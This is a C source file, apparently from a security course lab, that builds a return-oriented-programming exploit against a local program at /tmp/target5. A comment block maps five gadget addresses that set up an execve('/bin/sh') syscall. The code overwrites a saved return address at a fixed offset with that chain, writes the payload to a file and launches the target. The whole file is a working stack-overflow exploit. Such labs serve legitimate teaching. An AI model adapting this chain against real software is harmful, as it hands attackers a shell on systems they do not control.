#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"


/**
 * Exec "/bin/sh" syscall (no args, no env) conditions:
 * - rdx: NULL (value)
 * - rsi: NULL (value)
 * - rdi: "/bin/sh" (asciiz)
 * - rax: 0x3b (value)
 * 
 * Assembly gadget roadmap:
 * 1. 0x485d4b. insts: pop %rdx; ret;  # Pop value from stack to %rdx register.
 *      -> NB! Would require an argument for "pop" instruction, that would be 0.
 * 2. 0x4218b0. insts: pop %rsi; ret.  # Pop value from stack to %rsi register.
 *      -> NB! Would require an argument for "pop" instruction, that would be 0.
 * 3. 0x4042d6. insts: pop %rdi; ret.  # Pop value from stack to %rdi register.
 *      -> NB! Would require an argument for "pop" instruction, that would be "/bin/sh" string address.
 * 4. 0x472dff. insts: pop %rax; ret.  # Pop value from stack to %rax register.
 *      -> NB! Would require an argument for "pop" instruction, that would be 0x3b.
 * 5. 0x48709c: syscall; ret.          # Perform syscall.
***/


// Length of the exploit file
#define XPLOIT_LEN 512

// Distance between buffer address and dangerous "foo" function return address (in stack)
#define RETURN_OFFSET (300 + 4 + sizeof(void*))

// Address of "/bin/sh" zero-terminated string from "get_shell" function.
#define SHELL_ASCIIZ 0x4d9000

// Gadgets address array with arguments, all cast to the pointer length.
#define GADGET_SET {           \
  (void*) 0x0000000000485d4b,  \
  (void*) 0x0000000000000000,  \
  (void*) 0x00000000004218b0,  \
  (void*) 0x0000000000000000,  \
  (void*) 0x00000000004042d6,  \
  (void*) SHELL_ASCIIZ,        \
  (void*) 0x0000000000472dff,  \
  (void*) 0x000000000000003b,  \
  (void*) 0x000000000048709c   \
}


int main(int argc, char *argv[]) {
  char exploit[XPLOIT_LEN];

  // Fill all the buffer with zeroes
  memset(exploit, 0, sizeof(exploit));

  // Overwrite function return address with gadget array.
  void* addresses[] = GADGET_SET;
  memcpy(&exploit[RETURN_OFFSET], addresses, sizeof(addresses));

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
